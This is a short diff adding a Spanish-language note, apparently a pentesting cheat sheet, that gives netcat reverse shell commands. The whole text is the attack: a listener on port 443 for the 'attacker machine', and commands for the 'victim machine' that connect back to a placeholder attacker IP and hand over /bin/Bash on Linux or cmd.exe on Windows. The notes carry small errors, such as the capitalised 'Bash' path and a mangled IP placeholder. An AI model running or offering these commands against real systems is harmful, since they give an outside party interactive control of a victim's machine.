@@ -1,0 +1,5 @@
+maquina atacante
+nc -nlvp 443
+maquina víctima 
+linux:  nc <ip atacante>  -e /bin/Bash
+Windows :  nc <ip -atacante> -e cmd.exe
